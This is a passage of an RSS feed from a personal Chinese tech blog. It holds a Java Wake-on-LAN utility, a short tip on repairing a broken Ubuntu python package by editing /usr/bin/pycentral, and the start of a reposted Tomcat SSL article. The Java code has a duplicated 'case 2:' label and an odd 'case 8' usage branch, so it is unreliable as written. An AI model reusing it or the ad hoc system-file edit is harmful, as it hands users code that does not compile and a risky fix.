ip;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InetAddress destHost = null;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; destHost = InetAddress.getByName(destIP);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (UnknownHostException e) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // construct packet data<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte[] magicBytes = new byte[102];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 6; i++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; magicBytes[i] = (byte) 0xFF;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 16; i++) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int j = 0; j &lt; destMac.length; j++) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; magicBytes[6 + destMac.length * i + j] = destMac[j];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // create packet<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DatagramPacket dp = null;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dp = new DatagramPacket(magicBytes, magicBytes.length, destHost, 10000);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return dp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static void sendPacket(DatagramPacket dp) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DatagramSocket ds = new DatagramSocket();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ds.send(dp);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (SocketException e) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e.printStackTrace();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } catch (IOException ie) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ie.printStackTrace();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static int sendWakeUpMessage(String mac, String ip) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DatagramPacket dp = WOL4j.createPacket(mac, ip);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (dp != null) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WOL4j.sendPacket(dp);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0; // success<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1; // fail<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void main(String[] args) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String mac = "", ip = "";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; switch (args.length) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 0:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = "00-E0-4C-42-2B-AC";<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 8:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("Usage: WakeOnLan mac [ip]");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("&nbsp;&nbsp;&nbsp; mac format: 0005DA... or Seperated with '-' or ':' ");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 1:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = args[0];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 2:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 2:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mac = args[0];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ip = args[1];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("start send");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sendWakeUpMessage(mac, ip);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.out.println("finish send");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>}<br>class Tools<br>{<br><br>&nbsp;&nbsp;&nbsp; static boolean DEBUG = true;<br>&nbsp;&nbsp;&nbsp; static byte NUMBER_KEY = 48;<br>&nbsp;&nbsp;&nbsp; static byte UPPER_KEY = 55;<br>&nbsp;&nbsp;&nbsp; static byte LOWER_KEY = 87;<br>&nbsp;&nbsp;&nbsp; static byte HEX_KEY = 16;<br>&nbsp;&nbsp;&nbsp; static byte NUMBER_MAX = 57;<br>&nbsp;&nbsp;&nbsp; static byte NUMBER_MIN = 48;<br>&nbsp;&nbsp;&nbsp; static byte UPPER_MAX = 70;<br>&nbsp;&nbsp;&nbsp; static byte UPPER_MIN = 65;<br>&nbsp;&nbsp;&nbsp; static byte LOWER_MAX = 102;<br>&nbsp;&nbsp;&nbsp; static byte LOWER_MIN = 97;<br>&nbsp;&nbsp;&nbsp; static byte checkByte = 0;<br>&nbsp;&nbsp;&nbsp; static String MSG_CODING = "ISO8859_1";<br><br>&nbsp;&nbsp;&nbsp; public Tools()<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; public static byte[] StrToHex(String pStr)<br>&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte bytes[] = pStr.getBytes();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte tmpBytes[] = new byte[2];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; String tmpStr = null;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int i = -1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int ii = -1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Vector v = new Vector();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(i &lt; bytes.length - 1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[0] = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[1] = 0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[0] = bytes[i];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; checkByte = tmpBytes[0];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(tmpBytes[0] &gt;= NUMBER_MIN &amp;&amp; tmpBytes[0] &lt;= NUMBER_MAX)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[0] = (new Integer(tmpBytes[0] - NUMBER_KEY)).byteValue();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(tmpBytes[0] &gt;= UPPER_MIN &amp;&amp; tmpBytes[0] &lt;= UPPER_MAX)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[0] = (new Integer(tmpBytes[0] - UPPER_KEY)).byteValue();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(tmpBytes[0] &gt;= LOWER_MIN &amp;&amp; tmpBytes[0] &lt;= LOWER_MAX)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[0] = (new Integer(tmpBytes[0] - LOWER_KEY)).byteValue();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(checkByte == tmpBytes[0])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[0] = (new Integer(tmpBytes[0] * HEX_KEY)).byteValue();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[1] = bytes[i];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; checkByte = tmpBytes[1];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(tmpBytes[1] &gt;= NUMBER_MIN &amp;&amp; tmpBytes[1] &lt;= NUMBER_MAX)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[1] = (new Integer(tmpBytes[1] - NUMBER_KEY)).byteValue();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(tmpBytes[1] &gt;= UPPER_MIN &amp;&amp; tmpBytes[1] &lt;= UPPER_MAX)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[1] = (new Integer(tmpBytes[1] - UPPER_KEY)).byteValue();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(tmpBytes[1] &gt;= LOWER_MIN &amp;&amp; tmpBytes[1] &lt;= LOWER_MAX)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tmpBytes[1] = (new Integer(tmpBytes[1] - LOWER_KEY)).byteValue();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(checkByte == tmpBytes[1])<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ii++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch(ArrayIndexOutOfBoundsException arrayindexoutofboundsexception) { }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v.add(new Integer(tmpBytes[0] + tmpBytes[1]));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Object intList[] = v.toArray();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; byte result[] = new byte[intList.length];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(int li = 0; li &lt; intList.length; li++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; result[li] = ((Integer)intList[li]).byteValue();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return result;<br>&nbsp;&nbsp;&nbsp; }<br>}<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720093882025878/</guid>
    </item>
    <item>
      <title>
<![CDATA[安装aptoncd导致python-problem-report包损坏]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720094225451107/</link>
      <description>
<![CDATA[据说aptoncd可以制作Ubuntu的番茄花园，就想尝试一些，结果安装aptoncd失败，并导致python-problem-report损坏，<br>每次运行apt-get 安装或卸载软件都会出现这个错误 dynamic module does not define init function (inittime)<br>python-problem-report卸载不掉，解决方案：<br>修改/usr/bin/pycentral 把import里的time删掉，然后卸载！<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720094225451107/</guid>
    </item>
    <item>
      <title>
<![CDATA[配置Tomcat支持SSL，并用openssl管理证书[转]]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007101743831516/</link>
      <description>
<![CDATA[<TABLE cellSpacing="0" cellPadding="0" width="100%"  border="0" >  <TBODY>  <TR vAlign="top" >  <TD width="100%"  >  <H1>配置Tomcat 4使用SSL</H1><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="6" alt=""  src="http://www.ibm.com/i/c.gif"  width="1" ></TD>  <TD width="192" ><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="18" alt="developerWorks" src="http://www-128.ibm.com/developerworks/i/dw.gif"  width="192" ></TD></TR></TABLE>  <TABLE cellSpacing="0" cellPadding="0" width="100%"  border="0" >  <TBODY>  <TR vAlign="top" >  <TD width="10" ><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="1" alt=""  src="http://www.ibm.com/i/c.gif"  width="10" ></TD>  <TD width="100%"  >  <TABLE cellSpacing="0" cellPadding="0" width="160" align="right" border="0" >  <TBODY>  <TR>  <TD width="10" ><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="1" alt=""  